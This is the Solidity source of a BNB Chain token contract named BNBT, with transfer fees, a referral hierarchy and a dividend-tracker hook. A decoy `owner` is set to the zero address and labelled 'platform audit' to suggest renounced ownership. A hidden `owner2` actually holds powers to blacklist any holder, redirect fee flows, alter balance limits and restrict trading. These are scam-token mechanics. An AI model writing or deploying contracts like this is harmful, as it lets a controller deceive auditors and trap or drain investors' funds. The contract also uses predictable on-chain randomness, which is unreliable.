/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

pragma solidity =0.6.6;


// safe math
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Math error");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(a >= b, "Math error");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0 || b == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Math error");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0 || b == 0) {
            return 0;
        }
        uint256 c = a / b;
        return c;
    }
}


// owner2
contract Ownable {
    address public owner = address(0);  // platform audit
    address public owner2;              // real owner2

    constructor(address _owner2) internal {
        owner2 = _owner2;
    }

    modifier onlyOwner() {
        require(msg.sender == owner2, 'Token: owner2 error');
        _;
    }

    function transferOwnership(address newOwner2) public onlyOwner {
        if (newOwner2 != address(0)) {
            owner2 = newOwner2;
        }
    }
}


// erc20
interface IERC20 {
    function balanceOf(address _address) external view returns (uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function approve(address _spender, uint256 _value) external returns (bool);
    function allowance(address _owner, address _spender) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IToken is IERC20 {
    function totalFees() external view returns (uint256);
    function superAddress(address _address) external view returns (address);
    function juniorAddress(address _address) external view returns (address[] memory _addrs);
    function getLinkedinAddrs(address _address) external view returns (address[] memory _addrs);
    event BoundLinkedin(address from, address to);
}


interface IDividendTracker {
    function initBnbt() external returns (address, address);   // bnbt init
    function initBnbdao() external returns (address, address); // bnbdao init
    function tokenSwap() external;        // token swap
    function dividendRewards(address _from, uint256 _dividendTokenAmount) external; // dividend
    function addOrRemove(address _from, address _to) external; // add or remove
}


// BNBT
contract BNBT is IToken, Ownable {
    using SafeMath for uint256;
    address public dividendTracker;    // dividend contract address

    uint256 constant private _totalFees = 15;               // total fee is constant
    mapping(address => address) private _superAddress;      // super address 
    mapping(address => address[]) private _juniorAddress;   // junior address
    mapping(address => bool) public whitelistAddress;       // token not limit, transfer not fee
    mapping(address => bool) public blacklistAddress;       // not any transfer
    mapping (address => bool) public isPool;                // is pool

    uint256 public tokenLimit = 3 * 10**uint256(decimals);  // have token limit。whitelist and contract not limit
    uint256 public boundLinkedinMinAmount = 1 * (10**15);   // >= 0.001 can only be bound linked
    uint256 public tokenLeast = 1 * (10**16);               // retain 0.01
    
    bool public isOpen = false;    // opening。false = internal use, true = normal operation
    address private _firstOwner;   // special address not bound linked
    
    string constant public name = "BNBT";
    string constant public symbol = "BNBT";
    uint8 constant public decimals = 18;
    uint256 constant public totalSupply = 72000 * 10**uint256(decimals);  
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;


    // main
    constructor(address _owner2, address _dividendTracker) public Ownable(_owner2) {
        balances[_owner2] = totalSupply;   // owner2 gain all token
        _firstOwner = _owner2;             // not bound linked
        whitelistAddress[_owner2] = true;  // owner2 is whitelist
        emit Transfer(address(0), _owner2, totalSupply);

        dividendTracker = _dividendTracker;
        (address _routerAddress, address _poolAddress) = IDividendTracker(dividendTracker).initBnbt();  // init
        isPool[_routerAddress] = true;
        isPool[_poolAddress] = true;
    }

    // set whitelist
    function setWhitelist(address _address) public onlyOwner {
        whitelistAddress[_address] = !whitelistAddress[_address];
    }
    // set blacklist
    function setBlacklist(address _address) public onlyOwner {
        blacklistAddress[_address] = !blacklistAddress[_address];
    }
    // set is pool
    function setIsPool(address _address) public onlyOwner {
        isPool[_address] = !isPool[_address];
    }

    // change dividendTracker
    function setDividendTracker(address _dividendTracker) public onlyOwner {
        dividendTracker = _dividendTracker;
    }
    // change tokenLimit
    function setTokenLimit(uint256 _tokenLimit) public onlyOwner {
        tokenLimit = _tokenLimit;
    }
    // change boundLinkedinMinAmount
    function setBoundLinkedinMinAmount(uint256 _boundLinkedinMinAmount) public onlyOwner {
        boundLinkedinMinAmount = _boundLinkedinMinAmount;
    }
    // change tokenLeast
    function setTokenLeast(uint256 _tokenLeast) public onlyOwner {
        tokenLeast = _tokenLeast;
    }
 
    // is open
    function setIsOpen() public onlyOwner {
        isOpen = true;
    }

    function balanceOf(address _address) external view override returns (uint256) {
        return balances[_address];
    }

    function _approve(address _owner, address _spender, uint256 _value) private {
        allowed[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
    }

    function approve(address _spender, uint256 _value) public override returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) external view override returns (uint256) {
        return allowed[_owner][_spender];
    }

    function _transfer(address _from, address _to, uint256 _value) private {
        balances[_from] = SafeMath.sub(balances[_from], _value);
        balances[_to] = SafeMath.add(balances[_to], _value);
        emit Transfer(_from, _to, _value);
    }

    function _transferFull(address _from, address _to, uint256 _value) private {
        verifyBlacklist(_from, _to);   // verify blacklist
        uint256 _fee;

        if(whitelistAddress[_from] || whitelistAddress[_to] || _to == address(0)) {
            _transfer(_from, _to, _value);
        }else if(!isOpen) {
            // user -> user or any -> pool
            if(isPoolOrRouter(_from) && !isPoolOrRouter(_to)) revert('open error');
            _transfer(_from, _to, _value);
        }else {
            // any ok. 
            _fee = _value.mul(_totalFees).div(100);
            uint256 _val = _value.sub(_fee);
            _transfer(_from, dividendTracker, _fee);
            _transfer(_from, _to, _val);
        }

        if(!isContract(_from) && !isContract(_to)) {
            // swap
            try IDividendTracker(dividendTracker).tokenSwap() {} catch {}
        }
        // dividend
        try IDividendTracker(dividendTracker).dividendRewards(tx.origin, _fee) {} catch {}
        // add or remove
        try IDividendTracker(dividendTracker).addOrRemove(_from, _to) {} catch {}

        if(_value >= boundLinkedinMinAmount) boundLinkedin(_from, _to);   // boundLinkedin
        verifyTokenLeast(_from);  // verify balances
        verifyTokenLimit(_to);    // verify balances
    }

    function transfer(address _to, uint256 _value) public override returns (bool) {
        require(balances[msg.sender] >= _value, 'Token: balance error');
        _transferFull(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        require(balances[_from] >= _value, 'Token: balance error');
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
       _transferFull(_from, _to, _value);
        return true;
    }

    // true = contract
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    // true = pool or router
    function isPoolOrRouter(address _address) internal view returns (bool) {
        return isPool[_address];
    }

    // verify from balance
    function verifyTokenLeast(address _fromAddress) internal view {
        if(_fromAddress != address(0)) {
            require(
                _fromAddress == dividendTracker ||
                isPool[_fromAddress] || 
                whitelistAddress[_fromAddress] || 
                balances[_fromAddress] >= tokenLeast, 'Token: least error');
        }
    }

    // verify TokenLimit
    function verifyTokenLimit(address _toAddress) internal view {
        if(_toAddress != address(0)) {
            require(
                _toAddress == dividendTracker ||
                isPool[_toAddress] || 
                whitelistAddress[_toAddress] || 
                balances[_toAddress] <= tokenLimit, 'Token: balance limit');
        }
    }

    // verify
    function verifyBlacklist(address _from, address _to) internal view {
        if(blacklistAddress[_from] || blacklistAddress[_to]) {
            revert('blacklist error');
        }
    }

    // get totalFees
    function totalFees() public view override returns (uint256) {
        return _totalFees;
    }

    // bound linkedin
    function boundLinkedin(address _from, address _to) private {
        if(_to == _firstOwner) {
            return;   // first address, not super
        }
        if(_from == address(0) || _to == address(0)) {
            return;   // zero address not bound linkedin
        }
        if(isContract(_from) || isContract(_to) || _from == _to) {
            return;   // contract not bound linkedin, self and self not bound linkedin
        }
        // if to address not super
        if(_superAddress[_to] == address(0)) {
            _superAddress[_to] = _from;
            _juniorAddress[_from].push(_to);
            emit BoundLinkedin(_from, _to); // emit
        }
    }

    // get super address
    function superAddress(address _address) public view override returns (address) {
        return _superAddress[_address];
    }

    // get junior amount
    function juniorAmount(address _address) public view returns (uint256) {
        return _juniorAddress[_address].length;
    }

    // get all junior address
    function juniorAddress(address _address) public view override returns (address[] memory _addrs) {
        uint256 _length = _juniorAddress[_address].length;
        _addrs = new address[](_length);
        for(uint256 i = 0; i < _length; i++) {
            _addrs[i] = _juniorAddress[_address][i];
        }
    }

    // get dividend address
    // super 5 + junior 1 = 6, not address use 0address replace
    function getLinkedinAddrs(address _address) public view override returns (address[] memory _addrs) {
        _addrs = new address[](6);
        address _superNow = _address;
        for(uint256 i = 0; i < _addrs.length; i++) {
            if(i < 5) {
                // super 5
                _addrs[i] = _superAddress[_superNow];
                _superNow = _addrs[i];
            }else {
                // junior 1
                if(_juniorAddress[_address].length > 0) {
                    uint256 _index = radomNumber(_juniorAddress[_address].length);
                    _addrs[i] = _juniorAddress[_address][_index];
                }else {
                    _addrs[i] = address(0);
                }
            }
        }
        // [1,2,3,4,5,-1]
    }

    // radom number, [0-max)
    function radomNumber(uint256 _max) internal view returns(uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % _max;
    }

}